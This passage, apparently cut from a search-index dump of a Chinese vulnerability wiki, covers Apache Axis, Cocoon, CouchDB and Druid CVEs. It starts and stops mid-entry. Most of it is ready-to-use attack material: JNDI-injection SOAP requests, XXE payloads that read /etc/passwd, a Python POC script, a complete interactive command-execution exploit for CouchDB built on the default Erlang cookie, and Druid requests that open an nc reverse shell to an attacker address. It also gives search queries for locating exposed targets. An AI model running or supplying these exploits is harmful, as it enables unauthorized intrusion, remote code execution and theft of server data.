text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Accept-Language: en-US,en;q=0.5 SOAPAction: something Upgrade-Insecure-Requests: 1 Content-Type: application/xml Accept-Encoding: gzip, deflate Content-Length: 458 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003csoapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Body\u003e \u003cundeployment xmlns=\"http://xml.apache.org/axis/wsdd/\"\u003e \u003cservice name=\"randomService\"/\u003e \u003chandler name=\"RandomLog\"/\u003e \u003cservice name=\"jndiService\"/\u003e \u003c/undeployment\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e ","date":"0001-01-01","objectID":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/:3:1","tags":null,"title":"","uri":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/"},{"categories":null,"content":"AdminService JNDI注入 注册服务： POST /axis/services/AdminService HTTP/1.1 Host: your-ip:8080 Connection: close Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Accept-Language: en-US,en;q=0.5 SOAPAction: something Upgrade-Insecure-Requests: 1 Content-Type: application/xml Accept-Encoding: gzip, deflate Content-Length: 746 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\u003e \u003csoapenv:Body\u003e \u003cns1:deployment xmlns:ns1=\"http://xml.apache.org/axis/wsdd/\" xmlns=\"http://xml.apache.org/axis/wsdd/\" xmlns:java=\"http://xml.apache.org/axis/wsdd/providers/java\"\u003e \u003cns1:service name=\"testService\" provider=\"java:RPC\"\u003e \u003cns1:parameter name=\"className\" value=\"org.apache.axis.client.ServiceFactory\"/\u003e \u003cns1:parameter name=\"allowedMethods\" value=\"*\"/\u003e \u003c/ns1:service\u003e \u003c/ns1:deployment\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e 访问创建的testService进行jndi注入： POST /axis/services/testService HTTP/1.1 Host: your-ip:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://your-ip:8080/axis/servlet/AxisServlet Accept-Encoding: gzip, deflate Accept-Language: zh,zh-TW;q=0.9,zh-CN;q=0.8 Connection: close SOAPAction: Content-Type: text/xml;charset=UTF-8 Content-Length: 791 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:buil=\"http://build.antlr\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cbuil:getService soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\u003e \u003cenvironment xmlns:apachesoap=\"http://xml.apache.org/xml-soap\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xsi:type=\"apachesoap:Map\"\u003e \u003citem\u003e \u003ckey xsi:type=\"soapenc:string\"\u003ejndiName\u003c/key\u003e \u003cvalue xsi:type=\"soapenc:string\"\u003eldap://your-ip:1389/dlmaty\u003c/value\u003e \u003c/item\u003e \u003c/environment\u003e \u003c/buil:getService\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e 这里 JNDI 注入不成功，报错 java.lang.ClassCastException: javax.naming.Reference cannot be cast to org.apache.axis.client.Service。 可能是复现的环境采用需要1.8.0_102之前的环境。（待测） 卸载服务： POST /axis/services/AdminService HTTP/1.1 Host: your-ip:8080 Connection: close Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0 Accept-Language: en-US,en;q=0.5 SOAPAction: something Upgrade-Insecure-Requests: 1 Content-Type: application/xml Accept-Encoding: gzip, deflate Content-Length: 458 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003csoapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Body\u003e \u003cundeployment xmlns=\"http://xml.apache.org/axis/wsdd/\"\u003e \u003cservice name=\"testService\"/\u003e \u003c/undeployment\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e ","date":"0001-01-01","objectID":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/:3:2","tags":null,"title":"","uri":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/"},{"categories":null,"content":"Apache Cocoon XML注入 CVE-2020-11991 ","date":"0001-01-01","objectID":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/:0:0","tags":null,"title":"","uri":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/"},{"categories":null,"content":"漏洞描述 9月11日 Apache 软件基金会发布安全公告，修复了 Apache Cocoon xml外部实体注入漏洞（CVE-2020-11991）。 Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。 ","date":"0001-01-01","objectID":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/:1:0","tags":null,"title":"","uri":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/"},{"categories":null,"content":"漏洞影响 Apache Cocoon \u003c= 2.1.12 ","date":"0001-01-01","objectID":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/:2:0","tags":null,"title":"","uri":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/"},{"categories":null,"content":"网络测绘 app=\"Apache-Cocoon\" ","date":"0001-01-01","objectID":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/:3:0","tags":null,"title":"","uri":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/"},{"categories":null,"content":"漏洞复现 向**/v2/api/product/manger/getInfo** POST如下内容 \u003c!--?xml version=\"1.0\" ?--\u003e \u003c!DOCTYPE replace [\u003c!ENTITY ent SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cuserInfo\u003e \u003cfirstName\u003eJohn\u003c/firstName\u003e \u003clastName\u003e\u0026ent;\u003c/lastName\u003e \u003c/userInfo\u003e ","date":"0001-01-01","objectID":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/:4:0","tags":null,"title":"","uri":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Cocoon \u003c= 2.1.12 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-11991 \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" \u003c!--?xml version=\"1.0\" ?--\u003e \u003c!DOCTYPE replace [\u003c!ENTITY ent SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cuserInfo\u003e \u003cfirstName\u003eJohn\u003c/firstName\u003e \u003clastName\u003e\u0026ent;\u003c/lastName\u003e \u003c/userInfo\u003e \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-type\": \"text/xml\" } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] 含有CVE-2020-11991漏洞，响应为{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/:5:0","tags":null,"title":"","uri":"/apache-cocoon-xml%E6%B3%A8%E5%85%A5-cve-2020-11991/"},{"categories":null,"content":"Apache CouchDB epmd 远程命令执行漏洞 CVE-2022-24706 ","date":"0001-01-01","objectID":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/:0:0","tags":null,"title":"","uri":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/"},{"categories":null,"content":"漏洞描述 Apache CouchDB 是一个开源的无缝多主同步数据库，使用直观的HTTP/JSON API，并为可靠性而设计。 4月26日，Apache发布安全公告，公开了Apache CouchDB中的一个远程代码执行漏洞（CVE-2022-24706）。在3.2.2 版本之前的 Apache CouchDB 中，可以在不进行身份验证的情况下访问不正确的默认安装并获得管理员权限 ","date":"0001-01-01","objectID":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/:1:0","tags":null,"title":"","uri":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/"},{"categories":null,"content":"漏洞影响 CouchDB \u003c= 3.2.1 ","date":"0001-01-01","objectID":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/:2:0","tags":null,"title":"","uri":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/"},{"categories":null,"content":"网络测绘 port=\"4369\" \u0026\u0026 \"couchdb\" ","date":"0001-01-01","objectID":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/:3:0","tags":null,"title":"","uri":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/"},{"categories":null,"content":"漏洞复现 主页面， 默认端口为 5984 使用POC验证 ","date":"0001-01-01","objectID":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/:4:0","tags":null,"title":"","uri":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/"},{"categories":null,"content":"漏洞POC # Exploit Title: Apache CouchDB 3.2.1 - Remote Code Execution (RCE) # Date: 2022-01-21 # Exploit Author: Konstantin Burov, @_sadshade # Software Link: https://couchdb.apache.org/ # Version: 3.2.1 and below # Tested on: Kali 2021.2 # Based on 1F98D's Erlang Cookie - Remote Code Execution # Shodan: port:4369 \"name couchdb at\" # CVE: CVE-2022-24706 # References: # https://habr.com/ru/post/661195/ # https://www.exploit-db.com/exploits/49418 # https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/ # https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce # # #!/usr/local/bin/python3 import socket from hashlib import md5 import struct import sys import re import time TARGET = \"\" EPMD_PORT = 4369 # Default Erlang distributed port COOKIE = \"monster\" # Default Erlang cookie for CouchDB ERLNAG_PORT = 0 EPM_NAME_CMD = b\"\\x00\\x01\\x6e\" # Request for nodes list # Some data: NAME_MSG = b\"\\x00\\x15n\\x00\\x07\\x00\\x03\\x49\\x9cAAAAAA@AAAAAAA\" CHALLENGE_REPLY = b\"\\x00\\x15r\\x01\\x02\\x03\\x04\" CTRL_DATA = b\"\\x83h\\x04a\\x06gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\" CTRL_DATA += b\"\\x00\\x00\\x00\\x00\\x00w\\x00w\\x03rex\" def compile_cmd(CMD): MSG = b\"\\x83h\\x02gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00\" MSG += b\"\\x00\\x00h\\x05w\\x04callw\\x02osw\\x03cmdl\\x00\\x00\\x00\\x01k\" MSG += struct.pack(\"\u003eH\", len(CMD)) MSG += bytes(CMD, 'ascii') MSG += b'jw\\x04user' PAYLOAD = b'\\x70' + CTRL_DATA + MSG PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD return PAYLOAD print(\"Remote Command Execution via Erlang Distribution Protocol.\\n\") while not TARGET: TARGET = input(\"Enter target host:\\n\u003e \") # Connect to EPMD: try: epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) epm_socket.connect((TARGET, EPMD_PORT)) except socket.error as msg: print(\"Couldnt connect to EPMD: %s\\n terminating program\" % msg) sys.exit(1) epm_socket.send(EPM_NAME_CMD) #request Erlang nodes if epm_socket.recv(4) == b'\\x00\\x00\\x11\\x11': # OK data = epm_socket.recv(1024) data = data[0:len(data) - 1].decode('ascii') data = data.split(\"\\n\") if len(data) == 1: choise = 1 print(\"Found \" + data[0]) else: print(\"\\nMore than one node found, choose which one to use:\") line_number = 0 for line in data: line_number += 1 print(\" %d) %s\" %(line_number, line)) choise = int(input(\"\\n\u003e \")) ERLNAG_PORT = int(re.search(\"\\d+$\",data[choise - 1])[0]) else: print(\"Node list request error, exiting\") sys.exit(1) epm_socket.close() # Connect to Erlang port: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((TARGET, ERLNAG_PORT)) except socket.error as msg: print(\"Couldnt connect to Erlang server: %s\\n terminating program\" % msg) sys.exit(1) s.send(NAME_MSG) s.recv(5) # Receive \"ok\" message challenge = s.recv(1024) # Receive \"challenge\" message challenge = struct.unpack(\"\u003eI\", challenge[9:13])[0] #print(\"Extracted challenge: {}\".format(challenge)) # Add Challenge Digest CHALLENGE_REPLY += md5(bytes(COOKIE, \"ascii\") + bytes(str(challenge), \"ascii\")).digest() s.send(CHALLENGE_REPLY) CHALLENGE_RESPONSE = s.recv(1024) if len(CHALLENGE_RESPONSE) == 0: print(\"Authentication failed, exiting\") sys.exit(1) print(\"Authentication successful\") print(\"Enter command:\\n\") data_size = 0 while True: if data_size \u003c= 0: CMD = input(\"\u003e \") if not CMD: continue elif CMD == \"exit\": sys.exit(0) s.send(compile_cmd(CMD)) data_size = struct.unpack(\"\u003eI\", s.recv(4))[0] # Get data size s.recv(45) # Control message data_size -= 45 # Data size without control message time.sleep(0.1) elif data_size \u003c 1024: data = s.recv(data_size) #print(\"S---data_size: %d, data_recv_size: %d\" %(data_size,len(data))) time.sleep(0.1) print(data.decode()) data_size = 0 else: data = s.recv(1024) #print(\"L---data_size: %d, data_recv_size: %d\" %(data_size,len(data))) time.sleep(0.1) print(data.decode(),end = '') data_size -= 1024 ","date":"0001-01-01","objectID":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/:5:0","tags":null,"title":"","uri":"/apache-couchdb-epmd-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-24706/"},{"categories":null,"content":"Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749 ","date":"0001-01-01","objectID":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/:0:0","tags":null,"title":"","uri":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/"},{"categories":null,"content":"漏洞描述 由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。 ","date":"0001-01-01","objectID":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/:1:0","tags":null,"title":"","uri":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/"},{"categories":null,"content":"漏洞影响 Apache Druid ","date":"0001-01-01","objectID":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/:2:0","tags":null,"title":"","uri":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/"},{"categories":null,"content":"网络测绘 title=\"Apache Druid\" ","date":"0001-01-01","objectID":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/:3:0","tags":null,"title":"","uri":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/"},{"categories":null,"content":"漏洞复现 主页面 复现过程 请求包为 POST /druid/indexer/v1/sampler?for=connect Accept: application/json, text/plain, */* {\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]},\"inputFormat\":{\"type\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"raw\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"1970-01-01T00:00:00Z\"},\"dimensionsSpec\":{}},\"tuningConfig\":{\"type\":\"index\"}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}} ","date":"0001-01-01","objectID":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/:4:0","tags":null,"title":"","uri":"/apache-druid-loaddata-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-36749/"},{"categories":null,"content":"Apache Druid 远程代码执行漏洞 CVE-2021-25646 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/:0:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/"},{"categories":null,"content":"漏洞描述 Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。 Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。 Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。 参考链接： https://github.com/apache/druid/issues/2434 https://forum.ywhack.com/thread-115083-1-1.html https://druid.apache.org/docs/latest/operations/api-reference.html#broker https://lists.apache.org/thread.html/r20e0c3b10ae2c05a3aad40f1476713c45bdefc32c920b9986b941d8f@%3Cannounce.apache.org%3E https://www.o2oxy.cn/3090.html ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/:1:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/"},{"categories":null,"content":"漏洞影响 Apache Druid \u003c 0.20.1 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/:2:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/"},{"categories":null,"content":"环境搭建 这里使用Docker来搭建环境 Docker下载链接: https://github.com/apache/druid/archive/druid-0.20.0.zip 下载之后进入目录 distribution\\docker 执行命令编译 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8888 正常就行了 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/:3:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/"},{"categories":null,"content":"漏洞复现 漏洞原理: https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw POC请求包 POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} 注意请求中这个位置改为你的dnslog平台地址 java.lang.Runtime.getRuntime().exec(‘ping -c 4 xxxxx.dnslog.cn’) 发送请求即可命令执行 可能大部分都是docker搭建，而里面大部分命令是不存在的，但是发现docker里面居然默认是有 NC 命令的，那我们就可以用nc反弹一个shell了 反弹shell请求包 POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 1008 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} 发送请求包就可以得到一个交互式shell ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/:4:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-25646/"},{"categories":null,"content":"Apache Druid 远程代码执行漏洞 CVE-2021-26919 ","date":"0001-01-01","objectID":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/:0:0","tags":null,"title":"","uri":"/apache-druid-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-26919/"},{"categories":null,"content":"漏洞描述 Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。2021年3月30日，Apache Druid官方发布安全更新，修复了 CVE-2021-26919 Apache Druid 